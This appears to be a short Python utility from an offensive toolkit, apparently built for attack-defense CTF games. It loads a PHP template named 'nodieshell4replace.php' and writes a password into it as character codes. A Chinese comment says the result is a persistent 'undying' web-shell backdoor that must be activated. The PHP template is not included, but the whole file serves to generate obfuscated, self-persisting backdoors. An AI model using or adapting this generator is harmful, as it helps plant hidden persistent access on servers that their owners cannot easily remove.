# _*_ coding:utf-8 _*_

with open('./source/nodieshell4replace.php','r') as fp:
    nodieshell4replace = fp.read()

def generate_nodieshell(s):	#s为密码 生成指定密码的不死马后门 返回新后门的代码  不死马需要激活
	tmp = ''
	# print s
	for i in s:
		tmp += "$_uU(%s)." % (str(ord(i)))
	return nodieshell4replace.replace('REPLACEME',tmp)

# print generate_shell('aaaa')

